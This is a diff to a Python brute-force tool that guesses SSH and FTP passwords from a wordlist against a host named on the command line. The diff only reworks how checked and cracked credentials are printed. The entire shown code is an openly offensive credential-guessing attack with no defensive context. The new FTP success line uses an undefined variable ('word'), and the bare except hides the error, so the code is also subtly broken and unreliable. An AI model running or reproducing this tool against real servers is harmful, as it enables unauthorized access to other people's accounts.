@@ -148,13 +148,9 @@ if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then cont
          for password in ssh_line:
                 try :
                     res = ssh_connect(password)
-                    print(Fore.YELLOW+"[!] ACCOUNT CHECK [SSH] : "+username+"/"+password)
+                    print(Fore.YELLOW+"[!] ACCOUNT CHECK : [SSH] Host : "+sys.argv[1]+" Login : "+username+"/"+password)
                     if (res==0) :
-                        print(Fore.GREEN+"[+] ACCOUNT FOUND [SSH]: ")
-                        print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
-                        print("username : "+ username)
-                        print("Password : "+ password)
-                        print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
+                        print(Fore.GREEN+"[+] ACCOUNT FOUND : [SSH] Host : "+sys.argv[1]+" Login : "+username+"/"+password+" [SUCCESS]")
                         exit(0)
                 except Exception as e :
                         print(e)
@@ -187,9 +183,7 @@ def ftp_login(ip,username_ftp,passwd):
         ftp = FTP(ip)
         ftp.login(username_ftp, passwd)
         ftp.quit()
-        print(Fore.GREEN+"[*] ACCOUNT FOUND [FTP] : ")
-        print(Fore.GREEN+"[+] Username : " + username_ftp)
-        print(Fore.GREEN+"[+] Password : "+ passwd)
+        print(Fore.GREEN+"[!] ACCOUNT FOUND : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+word+"[SUCCESS]")
         exit(0)
     except:
         pass
@@ -201,7 +195,7 @@ def brute_force(ip, username_ftp, wordlists):
         words = ftp_list.splitlines()
         for word in words:
             word = word.strip()
-            print(Fore.YELLOW+'ACCOUNT CHECK [FTP] : '+username_ftp+'/'+word)
+            print(Fore.YELLOW+"[!] ACCOUNT CHECK : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+word)
             ftp_login(ip, username_ftp, word)
 
     except:
